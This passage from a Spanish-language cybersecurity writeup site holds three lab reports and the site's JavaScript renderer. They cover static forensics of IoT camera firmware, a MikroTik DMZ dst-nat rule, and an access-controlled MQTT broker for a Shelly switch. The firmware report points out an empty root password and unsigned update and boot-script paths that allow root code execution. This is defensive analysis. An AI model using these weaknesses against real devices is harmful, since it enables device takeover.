"64           0x40          Linux kernel ARM boot executable zImage (little-endian)",
"18400        0x47E0        gzip compressed data (kernel comprimido)",
"2752512      0x2A0000      Squashfs filesystem, little endian, v4.0, compression:xz, 6930534 bytes, 1211 inodes",
"13238272     0xCA0000      JFFS2 filesystem, little endian",
"```",
"Binwalk identifica la cabecera uImage, el kernel Linux (zImage, con su bloque comprimido en gzip), un sistema de ficheros raíz Squashfs comprimido con xz y una partición de datos JFFS2.",
"## 3. Extracción del contenido",
"```",
"$ binwalk -e tf_recovery.img",
"$ ls _tf_recovery.img.extracted/",
"squashfs-root  2A0000.squashfs  47E0  CA0000.jffs2",
"$ ls _tf_recovery.img.extracted/squashfs-root/",
"bin  boot.sh  dev  etc  gm  lib  lib32  linuxrc  mnt  opt  proc  root  run  sbin  sys  tmp  usr  var",
"```",
"`squashfs-root` contiene el sistema de ficheros raíz con la estructura típica de un Linux embebido (FHS).",
"## 4. Sistema operativo",
"- `file` indica `Linux-3.3.0` y `Linux/ARM`; binwalk confirma el `zImage` de ARM.",
"- La raíz sigue la estructura estándar de Linux (`/bin`, `/etc`, `/lib`, `/proc`, `/sys`...).",
"- Hay un único binario `linuxrc` en la raíz, patrón característico de los sistemas embebidos mínimos tipo BusyBox.",
"**Respuesta:** Linux embebido, kernel 3.3.0 para ARM, compilado el 12/12/2018, un sistema mínimo tipo BusyBox típico de dispositivos IoT de bajo coste.",
"## 5. Sistemas de ficheros",
"- **SquashFS** (offset `0x2A0000`, partición raíz): versión 4.0, little endian, compresión xz, 6.930.534 bytes, 1.211 inodos, bloques de 131.072 bytes, creado el 2018-12-12 10:19:38. Es de solo lectura y comprimido, el estándar para la raíz de dispositivos con poca flash.",
"- **JFFS2** (offset `0xCA0000`, partición de datos): sistema de ficheros de lectura y escritura pensado para memoria flash NAND/NOR. El script `rcS` lo referencia como `/mnt/data`, donde se guardan claves RSA, aplicaciones y configuración de usuario.",
"## 6. Servicios",
"Se obtuvieron leyendo el script de arranque y la estructura de `/etc`:",
"```",
"$ cat _tf_recovery.img.extracted/squashfs-root/etc/init.d/rcS",
"```",
"- **mdev (`S10mdev`):** gestión dinámica de dispositivos en `/dev` (equivalente a udev en BusyBox).",
"- **Servicio de cámara (`S50gm`):** servicio principal del dispositivo.",
"- **Mosquitto (broker MQTT):** el usuario `mosquitto` en `/etc/passwd` y `/etc/shadow` y el directorio `/etc/mosquitto` lo confirman.",
"- **WiFi (hostapd / wpa_supplicant):** `/etc/hostapd.conf`, `/etc/testhostapd.conf` y `/etc/wpa_supplicant.conf` indican conectividad como punto de acceso y como cliente.",
"- **D-Bus:** el directorio `/etc/dbus-1` y el usuario `dbus` indican comunicación entre procesos.",
"- **Servidor web:** el usuario `www-data` (UID 33) sugiere un servidor HTTP embebido, probablemente para la configuración local.",
"- **Samba:** el directorio `/etc/samba` indica posible acceso a recursos por SMB.",
"- **Actualización OTA:** `rcS` busca `/mnt/data/user_data`, lo extrae y reinicia.",
"- **Modos de prueba de fábrica (`ft_mode`):** 1 = SA, 2 = AP, 3 = P2P, 4 = MTBF, con validación RSA de los scripts de prueba mediante `/mnt/data/ft/rsa_decrypt`.",
"- **Scripts de inicio personalizados:** `rcS` recorre `/mnt/data/imi/imi_init/S??*` y acaba ejecutando `/mnt/data/test/boot.sh`, ambos en la partición JFFS2.",
"## 7. Usuarios",
"```",
"$ cat squashfs-root/etc/passwd",
"root::0:0:root:/root:/bin/sh",
"daemon:x:1:1:daemon:/usr/sbin:/bin/false",
"bin:x:2:2:bin:/bin:/bin/false",
"sys:x:3:3:sys:/dev:/bin/false",
"sync:x:4:100:sync:/bin:/bin/sync",
"mail:x:8:8:mail:/var/spool/mail:/bin/false",
"www-data:x:33:33:www-data:/var/www:/bin/false",
"operator:x:37:37:Operator:/var:/bin/false",
"nobody:x:99:99:nobody:/home:/bin/false",
"dbus:x:1000:1000:DBus messagebus user:/var/run/dbus:/bin/false",
"mosquitto:x:1001:99:Mosquitto user:/:/bin/false",
"$ cat squashfs-root/etc/shadow",
"root:*:10933:0:99999:7:::",
"daemon:*:10933:0:99999:7:::",
"bin:*:10933:0:99999:7:::",
"(... sys, sync, mail, www-data, operator y nobody igual ...)",
"dbus:*:::::::",
"mosquitto:*:::::::",
"```",
"Hay **11 usuarios**. Los de servicio (`www-data`, `dbus`, `mosquitto`, `daemon`, `nobody`, `operator`...) tienen la contraseña bloqueada (`*`) y shell `/bin/false`. La excepción es `root`: su entrada en `/etc/passwd` tiene el campo de contraseña **vacío** (`root::0:0`), lo que implica acceso root sin autenticación para quien consiga un shell. En `shadow` figura `*`, una discrepancia que conviene confirmar con análisis dinámico (por ejemplo emulando el firmware con QEMU).",
"## 8. Evaluación de riesgos",
"- **Cuenta root sin contraseña (crítico):** cualquier vía de acceso a un shell (Telnet, SSH, un fallo del servidor web o del broker MQTT) da control total.",
"- **Kernel obsoleto (alto):** el kernel 3.3.0 se publicó en 2012 y el firmware se compiló en 2018. Arrastra cientos de vulnerabilidades corregidas después y sin parches para esa versión.",
"- **Actualización de firmware sin verificación (alto):** `rcS` aplica sin comprobar firma cualquier `/mnt/data/user_data` que encuentre:",
"```",
"FIRMWARE_NAME='/mnt/data/user_data'",
"if [ -f \"$FIRMWARE_NAME\" ]; then",
"  mv ${FIRMWARE_NAME} /tmp/",
"  tar -xvf /tmp/user_data -C /tmp/imiApp    # sin verificación de firma",
"  cp /tmp/imiApp/* /mnt/data -rf",
"  reboot                                    # se aplica de inmediato",
"fi",
"```",
"Un atacante con acceso a la partición de datos podría dejar ahí un paquete malicioso que se instalaría en el siguiente arranque. La verificación RSA solo se aplica a los scripts de pruebas de fábrica.",
"- **Superficie de ataque amplia (medio):** broker MQTT, servidor web, Samba y WiFi en modo AP funcionando a la vez; si alguno tiene fallos o credenciales por defecto, un atacante en la misma red podría comprometer el dispositivo.",
"- **Ejecución de scripts desde la partición de datos (medio):** `rcS` ejecuta todo lo que haya en `/mnt/data/imi/imi_init/` y `/mnt/data/test/boot.sh`. Quien pueda escribir en `/mnt/data` ejecutaría código como root en cada arranque.",
"## Conclusiones",
"- **Sistema operativo:** Linux embebido, kernel 3.3.0 para ARM, muy desactualizado.",
"- **Sistemas de ficheros:** SquashFS (raíz, solo lectura) y JFFS2 (datos, lectura y escritura).",
"- **Servicios:** MQTT, WiFi (AP y cliente), D-Bus, servidor web, Samba y actualización OTA.",
"- **Usuarios:** 11, con `root` sin contraseña como vulnerabilidad crítica.",
"- **Tipo de análisis:** forense estático, no invasivo y reproducible.",
"- Un archivo de firmware contiene muchas evidencias (usuarios, configuración de red, servicios, fechas de compilación y lógica de arranque) que se extraen sin encender el dispositivo, lo que hace de esta técnica algo muy valioso en investigaciones de seguridad IoT."
].join("\n")
},

{
 id:"router-mikrotik-red-dmz", category:"Redes",
 title:"Configuración de un router MikroTik como red DMZ",
 summary:"Cómo exponer un equipo de la red a internet con todos los puertos abiertos mediante una regla dst-nat en MikroTik, con registro y consideraciones de seguridad.",
 tags:["MikroTik", "RouterOS", "NAT", "dst-nat", "DMZ", "Winbox"],
 content:[
"## Objetivo",
"Configurar un router MikroTik para que actúe como DMZ: todo el tráfico que llega desde internet se redirige a un único equipo de la red local (un PC o una consola), con todos sus puertos abiertos. Es una alternativa rápida a abrir los puertos uno a uno. Práctica realizada en el curso de especialización en Ciberseguridad en entornos de las tecnologías de operación (OT).",
"## 1. Identificar el equipo de destino",
"Antes de abrir nada hay que conocer la IP exacta del equipo que recibirá el tráfico (en esta práctica, `10.0.0.252`).",
"- En Winbox, `IP > DHCP Server > Leases` muestra los equipos conectados y su dirección.",
"- Hay que asegurar que esa IP no cambie, convirtiendo la concesión en una reserva estática (botón `Make Static`). Si la IP cambia, la regla de DMZ dejaría de apuntar al equipo correcto.",
"Equivalente por terminal:",
"```",
"/ip dhcp-server lease print",
"/ip dhcp-server lease make-static [find address=10.0.0.252]",
"```",
"## 2. Crear la regla de redirección total (NAT)",
"La DMZ es una regla NAT que captura todas las peticiones externas que entran por la interfaz de internet.",
"- Ir a `IP > Firewall` y abrir la pestaña `NAT`; añadir una regla nueva.",
"- Pestaña `General`: `Chain` = `dstnat`; `In. Interface` = la interfaz por la que entra internet (normalmente `ether1`, la WAN). Sin protocolo ni puertos, la regla afecta a todo el tráfico.",
"- Pestaña `Action`: `Action` = `dst-nat`; `To Addresses` = `10.0.0.252`; `To Ports` vacío, para que se mantengan los puertos originales y queden todos abiertos.",
"Las dos pestañas de la regla en Winbox: en `General` se define la cadena `dstnat` y, en `Action`, el destino `10.0.0.252` con `To Ports` vacío. La interfaz de entrada se ajusta a la WAN al crear la regla.",
"![Winbox, pestaña General de la nueva regla NAT: Chain dstnat](img/dmz-nat-general.png)",
"![Winbox, pestaña Action de la regla NAT: dst-nat hacia 10.0.0.252 y To Ports vacío](img/dmz-nat-action.png)",
"Equivalente por terminal:",
"```",
"/ip firewall nat add chain=dstnat in-interface=ether1 action=dst-nat to-addresses=10.0.0.252 comment=\"DMZ\"",
"```",
"## 3. Registro y monitorización (opcional)",
"Como abrir todos los puertos es un riesgo, conviene vigilar el tráfico que llega a la DMZ.",
"- Marcar la casilla `Log` en la pestaña `Action` de la regla (opcionalmente con un prefijo para filtrar).",
"- Consultar el menú `Log` del router para ver los paquetes que se están redirigiendo.",
"```",
"/ip firewall nat set [find comment=\"DMZ\"] log=yes log-prefix=\"DMZ\"",
"/log print where message~\"DMZ\"",
"```",
"## 4. Comprobación",
"- En la lista de reglas NAT, el contador de paquetes de la regla debe aumentar cuando llegan peticiones desde fuera.",
"```",
"/ip firewall nat print stats where comment=\"DMZ\"",
"```",
"- Desde una red externa, un escaneo o una conexión a cualquier puerto abierto en el equipo de destino debe llegar a él.",
"## 5. Consideraciones de seguridad",
"- Usar la DMZ solo cuando sea estrictamente necesario, y solo con equipos que tengan su propio firewall activo, porque queda expuesto a internet con todos los puertos abiertos.",
"- Dejar siempre fijada la interfaz de entrada: sin ella la regla también redirigiría el tráfico de la red local.",
"- Si el firewall de `forward` bloquea lo que no sea tráfico redirigido (como hace la configuración por defecto de MikroTik), la regla `dst-nat` debe quedar dentro de lo permitido."
].join("\n")
},

{
 id:"mqtt-consumo-electrico-mosquitto-shelly", category:"IoT",
 title:"Monitorización y control de consumo eléctrico con MQTT: Mosquitto en Docker y Shelly Pro 4PM",
 summary:"Un broker Mosquitto en Docker recibe el consumo de un switch Shelly Pro 4PM y permite apagarlo desde MQTT, con usuarios de solo lectura y administrador; además, el rol de tech leader guiando al grupo.",
 tags:["MQTT", "Mosquitto", "Docker", "Portainer", "Shelly Pro 4PM", "MQTT Explorer"],
 content:[
"## Objetivo",
"Implementar un sistema de monitorización y control remoto de un consumo eléctrico mediante MQTT: un switch inteligente envía su consumo en tiempo real a un broker propio y puede apagarse enviándole un comando por MQTT. Práctica realizada en el curso de especialización en Ciberseguridad en entornos de las tecnologías de operación (OT).",
"En la práctica asumí el rol de **tech leader**: el profesor explicó el sistema y los objetivos, y yo me encargué de guiar al resto de compañeros. Para ello preparé, con ayuda de IA, una guía con las instrucciones para que cada uno desplegase su propia infraestructura y completase la práctica de forma autónoma, y me encargué de configurar el switch para que apuntase al broker de cada compañero.",
"## Sistema",
"- **Shelly Pro 4PM:** switch inteligente conectado a una toma de corriente, con un dispositivo consumidor enchufado (por ejemplo una pantalla). Mide el consumo y lo envía por MQTT. Se gestiona por su puerto Ethernet.",
"- **Broker MQTT (Mosquitto):** recibe los datos y atiende las órdenes.",
"- **MQTT Explorer:** cliente con el que cada alumno comprueba que todo funciona.",
"## Infraestructura de cada alumno",
"Una máquina con Ubuntu Server y Docker instalado, con dos servicios en contenedores: el broker Mosquitto y Portainer para gestionar los contenedores. Estructura del proyecto del broker (`~/docker/mosquito`):",
"```",
"docker-compose.yml",
"inicio                 # script de arranque",
"config/",
"  mosquitto.conf",
"  passwd",
"  acl",
"data/",
"log/",
"```",
"`docker-compose.yml`:",
"```",
"services:",
"  mosquitto:",
"    image: eclipse-mosquitto:latest",
"    container_name: mosquitto",
"    restart: unless-stopped",
"    ports:",
"      - \"1883:1883\"",
"    volumes:",
"      - ./config:/mosquitto/config",
"      - ./data:/mosquitto/data",
"      - ./log:/mosquitto/log",
"```",
"Script `inicio`, que muestra un banner, levanta el contenedor y avisa:",
"```",
"#!/bin/bash",
"echo \"Iniciando Mosquitto...\"",
"# (banner ASCII)",
"docker compose up -d --build",
"echo \"Mosquitto levantado 🚀\"",
"```",
"Portainer queda accesible en el puerto 9000 y permite ver los contenedores desde el navegador.",
"## Configuración del broker",
"`config/mosquitto.conf`, sin acceso anónimo y con usuarios y permisos por fichero:",
"```",
"listener 1883",
"allow_anonymous false",
"password_file /mosquitto/config/passwd",
"acl_file /mosquitto/config/acl",
"```",
"Dos usuarios con contraseña (`mosquitto_passwd` dentro del contenedor):",
"```",
"docker exec -it mosquitto mosquitto_passwd -c /mosquitto/config/passwd lector",
"docker exec -it mosquitto mosquitto_passwd /mosquitto/config/passwd admin",
"```",
"### Topics",
"Se necesitan al menos dos:",
"- **Topic de consumo:** recibe los datos de consumo que publica el switch; solo se usa para lectura. En un Shelly con MQTT activado se publica bajo su prefijo, por ejemplo `shellypro4pm/status/switch:0`.",
"- **Topic de control:** recibe el comando que apaga el switch. En los Shelly de segunda generación los comandos RPC se envían a `<prefijo>/rpc`, por ejemplo `shellypro4pm/rpc`. El formato exacto del comando está en el manual del dispositivo.",
"### Usuarios y permisos",
"`config/acl`:",
"```",
"# Usuario de solo lectura: solo puede suscribirse al topic de consumo",
"user lector",
"topic read shellypro4pm/status/switch:0",
"",
"# Administrador: lee todos los topics y publica en el topic de control",
"user admin",
"topic read #",
"topic write shellypro4pm/rpc",
"```",
"Los nombres de topic dependen del prefijo que se configure en el Shelly; los de arriba son orientativos.",
"## Configuración del switch",
"Con el Shelly conectado por Ethernet, en su interfaz web se activa MQTT (`Settings > MQTT`) y se indica la dirección IP o el hostname del broker de cada alumno, el puerto 1883, el usuario y la contraseña y el prefijo del topic. Para probar a cada compañero bastaba con cambiar la dirección del broker.",
"## Verificación con MQTT Explorer",
"### Usuario de solo lectura",
"- Conectar al broker propio con `lector`.",
"- Se reciben los datos de consumo del switch (potencia, tensión, corriente...).",
"- Si se intenta publicar, el broker descarta el mensaje por falta de permiso y el switch no reacciona.",
"### Usuario administrador",
"- Conectar con `admin` y publicar en el topic de control un comando de apagado, por ejemplo:",
"```",
"topic:   shellypro4pm/rpc",
"payload: {\"id\":1,\"src\":\"admin\",\"method\":\"Switch.Set\",\"params\":{\"id\":0,\"on\":false}}",
"```",
"- El switch se apaga y el dispositivo conectado se queda sin corriente.",
"- El comando solo funciona con las credenciales de administrador.",
"## Comprobación final",
"Después, repasé yo mismo toda la práctica para confirmar que el despliegue funcionaba y que el resultado era el esperado. Al ejecutar `./inicio` se crean la red `mosquito_default` y el contenedor `mosquitto`, y en Portainer se ven los dos contenedores, `mosquitto` y `portainer`, en estado `running`.",
"![Despliegue de Mosquitto con ./inicio: red y contenedor creados](img/mosquitto-funcionando.png)",
"## Resultado esperado",
"Cada alumno debía demostrar que su servidor MQTT funciona, que los datos de consumo llegan desde el switch, que los permisos de los usuarios están bien configurados y que el apagado remoto solo funciona con credenciales de administrador.",
"## Valoración y lecciones aprendidas",
"En general, la práctica fue satisfactoria: la mayoría de compañeros desplegó correctamente su infraestructura y entendió el funcionamiento del sistema. Quedan varias cosas por mejorar:",
"- **Hacer la práctica antes de forma individual:** habría dado más agilidad para resolver los errores recurrentes y anticipar los problemas comunes.",
"- **Preguntar la fecha límite desde el principio:** era un dato clave y fue un error de novato no hacerlo.",
"- **Centrar la guía en el cómo y no solo en el objetivo final:** aunque el resultado podía alcanzarse de varias maneras, el profesor esperaba una implementación concreta, así que una guía centrada en el procedimiento habría reducido dudas y desviaciones.",
"- Además, la experiencia fue útil para practicar la coordinación y la forma de transmitir contenidos técnicos a un grupo."
].join("\n")
}
];

function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
function inline(s){return esc(s).replace(/`([^`]+)`/g,"<code>$1</code>").replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>")}
function md(src){
  var out=[],lines=src.split("\n"),inCode=false,inList=false;
  lines.forEach(function(l){
    if(l.indexOf("```")===0){
      if(inList){out.push("</ul>");inList=false}
      out.push(inCode?"</code></pre>":"<pre><code>");inCode=!inCode;return}
    if(inCode){out.push(esc(l));return}
    var m;
    if((m=l.match(/^!\[(.*)\]\((img\/[A-Za-z0-9._-]+)\)$/))){
      if(inList){out.push("</ul>");inList=false}
      out.push("<figure><img src=\""+m[2]+"\" alt=\""+esc(m[1])+"\" loading=\"lazy\"><figcaption>"+esc(m[1])+"</figcaption></figure>");return}
    if((m=l.match(/^(#{2,3}) (.*)/))){
      if(inList){out.push("</ul>");inList=false}
      out.push("<h"+m[1].length+">"+inline(m[2])+"</h"+m[1].length+">");return}
    if(l.indexOf("- ")===0){
      if(!inList){out.push("<ul>");inList=true}
      out.push("<li>"+inline(l.slice(2))+"</li>");return}
    if(inList){out.push("</ul>");inList=false}
    if(l.trim())out.push("<p>"+inline(l)+"</p>");
  });
  if(inList)out.push("</ul>");
  return out.join("\n").replace(/<pre><code>\n/g,"<pre><code>").replace(/\n<\/code><\/pre>/g,"</code></pre>");
}


var CATS={
 "Análisis forense":{c:"#a78bfa",l:"#7c3aed",p:'<circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/>'},
 "Análisis de aplicaciones":{c:"#34d399",l:"#059669",p:'<rect x="7" y="2" width="10" height="20" rx="2"/><path d="M11 18h2"/>'},
 "IoT":{c:"#22d3ee",l:"#0891b2",p:'<rect x="6" y="6" width="12" height="12" rx="2"/><path d="M9 2v4M15 2v4M9 18v4M15 18v4M2 9h4M2 15h4M18 9h4M18 15h4"/>'},
 "Redes":{c:"#fbbf24",l:"#b45309",p:'<circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 010 18M12 3a14 14 0 000 18"/>'},
 "Laboratorios":{c:"#fb7185",l:"#e11d48",p:'<path d="M9 3h6M10 3v6L4.5 19a2 2 0 001.8 3h11.4a2 2 0 001.8-3L14 9V3"/><path d="M7.5 15h9"/>'}
};
var DEF={c:"#60a5fa",l:"#2563eb",p:'<path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6l8-3z"/>'};
function cat(n){return CATS[n]||DEF}
function icon(n){return '<span class="ico"><svg viewBox="0 0 24 24" aria-hidden="true">'+cat(n).p+'</svg></span>'}
var reduce=window.matchMedia&&matchMedia("(prefers-reduced-motion: reduce)").matches;

/* ---- tema ---- */
function setTheme(t){document.documentElement.setAttribute("data-theme",t);try{localStorage.setItem("theme",t)}catch(e){}}
document.getElementById("themeBtn").onclick=function(){
  setTheme(document.documentElement.getAttribute("data-theme")==="light"?"dark":"light")};

/* ---- portada ---- */
function sortList(a,b){if(!a.date&&!b.date)return 0;if(!a.date)return -1;if(!b.date)return 1;return b.date.localeCompare(a.date)}
var active="Todos";
function renderList(){
  var cats=["Todos"];
  WRITEUPS.forEach(function(w){if(cats.indexOf(w.category)<0)cats.push(w.category)});
  var chips=document.getElementById("chips");chips.innerHTML="";
  cats.forEach(function(c){
    var n=c==="Todos"?WRITEUPS.length:WRITEUPS.filter(function(w){return w.category===c}).length;
    var b=document.createElement("button");b.type="button";b.className="chip";
    b.innerHTML=esc(c)+" <i>"+n+"</i>";b.setAttribute("aria-pressed",String(c===active));
    b.onclick=function(){active=c;renderList()};chips.appendChild(b)});
  var box=document.getElementById("cards");box.innerHTML="";
  WRITEUPS.filter(function(w){return active==="Todos"||w.category===active}).sort(sortList).forEach(function(w,i){
    var a=document.createElement("a");a.className="card";a.href="#"+w.id;
    a.style.setProperty("--cd",cat(w.category).c);a.style.setProperty("--cl",cat(w.category).l);a.style.setProperty("--i",i);
    var shown=w.tags.slice(0,4),extra=w.tags.length-shown.length;
    a.innerHTML='<div class="cat">'+icon(w.category)+'<span>'+esc(w.category)+(w.date?" · "+esc(w.date):"")+'</span></div>'+
      '<h2>'+esc(w.title)+'</h2><p>'+esc(w.summary)+'</p>'+
      '<div class="tags">'+shown.map(function(t){return '<span class="tag">'+esc(t)+'</span>'}).join("")+(extra>0?'<span class="tag">+'+extra+'</span>':"")+'</div>'+
      '<span class="more">Leer informe <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></span>';
    box.appendChild(a)});
}

/* ---- lector ---- */
function slug(t){return t.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g,"").replace(/[^a-z0-9]+/g,"-").replace(/^-|-$/g,"")||"sec"}
var heads=[];
function buildToc(){
  var body=document.querySelector("#article .body"),nav=document.getElementById("tocNav");nav.innerHTML="";heads=[];
  var used={};
  body.querySelectorAll("h2,h3").forEach(function(h){
    var s=slug(h.textContent),n=used[s]=(used[s]||0)+1;h.id=n>1?s+"-"+n:s;
    var a=document.createElement("a");a.href="#"+h.id;a.textContent=h.textContent;if(h.tagName==="H3")a.className="sub";
    a.onclick=function(e){e.preventDefault();h.scrollIntoView({behavior:reduce?"auto":"smooth",block:"start"});
      if(!window.matchMedia("(min-width:1000px)").matches)document.getElementById("toc").open=false};
    nav.appendChild(a);heads.push([h,a])});
  document.getElementById("toc").classList.toggle("hidden",heads.length<2);
  syncTocOpen();
}
function syncTocOpen(){document.getElementById("toc").open=window.matchMedia("(min-width:1000px)").matches}
window.matchMedia("(min-width:1000px)").addEventListener&&window.matchMedia("(min-width:1000px)").addEventListener("change",syncTocOpen);

var ticking=false;
function onScroll(){
  if(ticking)return;ticking=true;
  requestAnimationFrame(function(){
    ticking=false;
    var view=document.getElementById("view"),bar=document.getElementById("progress");
    if(view.classList.contains("hidden")){bar.style.transform="scaleX(0)";return}
    var art=document.getElementById("article"),r=art.getBoundingClientRect();
    var total=r.height-window.innerHeight*0.6,done=-r.top+80;
    bar.style.transform="scaleX("+Math.max(0,Math.min(1,total>0?done/total:1))+")";
    var cur=null;heads.forEach(function(p){if(p[0].getBoundingClientRect().top<120)cur=p});
    heads.forEach(function(p){p[1].classList.toggle("on",p===cur)});
  });
}
window.addEventListener("scroll",onScroll,{passive:true});window.addEventListener("resize",onScroll);

function route(){
  var id=location.hash.slice(1),w=WRITEUPS.filter(function(x){return x.id===id})[0];
  var list=document.getElementById("list"),view=document.getElementById("view");
  if(w){
    list.classList.add("hidden");view.classList.remove("hidden");
    var art=document.getElementById("article");art.style.setProperty("--cd",cat(w.category).c);art.style.setProperty("--cl",cat(w.category).l);
    art.innerHTML='<div class="a-head"><div class="cat">'+icon(w.category)+
      '<span>'+esc(w.category)+(w.date?" · "+esc(w.date):"")+'</span></div><h1>'+esc(w.title)+'</h1>'+
      '<div class="tags">'+w.tags.map(function(t){return '<span class="tag">'+esc(t)+'</span>'}).join("")+'</div></div>'+
      '<div class="body">'+md(w.content)+'</div>';
    buildToc();document.title=w.title+" · Javier González";
    window.scrollTo(0,0);
  }else{
    view.classList.add("hidden");list.classList.remove("hidden");document.title="Javier González · Writeups de ciberseguridad";
    heads=[];
  }
  onScroll();
}

/* ---- visor de imágenes ---- */
var lb=document.getElementById("lb");
function openLb(img){lb.querySelector("img").src=img.src;lb.querySelector("img").alt=img.alt;lb.querySelector("p").textContent=img.alt;
  lb.classList.add("open");document.body.style.overflow="hidden";document.getElementById("lbClose").focus()}
function closeLb(){lb.classList.remove("open");document.body.style.overflow=""}
document.getElementById("article").addEventListener("click",function(e){if(e.target.tagName==="IMG")openLb(e.target)});
lb.addEventListener("click",closeLb);
document.addEventListener("keydown",function(e){if(e.key==="Escape"&&lb.classList.contains("open"))closeLb()});

window.addEventListener("hashchange",route);
renderList();route();
</script>
